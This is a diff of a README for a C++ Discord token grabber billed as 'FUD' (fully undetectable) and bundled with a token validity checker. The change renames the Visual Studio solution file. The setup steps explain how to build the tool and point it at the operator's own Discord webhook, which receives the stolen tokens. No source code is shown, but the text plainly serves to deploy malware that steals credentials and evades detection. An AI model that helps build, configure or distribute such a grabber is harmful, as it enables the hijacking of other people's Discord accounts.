@@ -13,7 +13,7 @@ C++ Discord Token Grabber ( FUD )
  DTV ( Discord Token Validity Checker )
  #
  ### 💠 Setup »
-  Step 1 : ```Open TokenGrabber.sln In Visual Studio```\
+  Step 1 : ```Open DTGPlusPlus.sln In Visual Studio```\
   Step 2 : ```Set Release x86 & Multi Threaded (MT) & CPP Language Standard: 17```\
   Step 3 : ```Open Core.h And Modify Webhook Variable With Your Discord Webhook Address ```\
   Step 4 : ```Build Solution```\
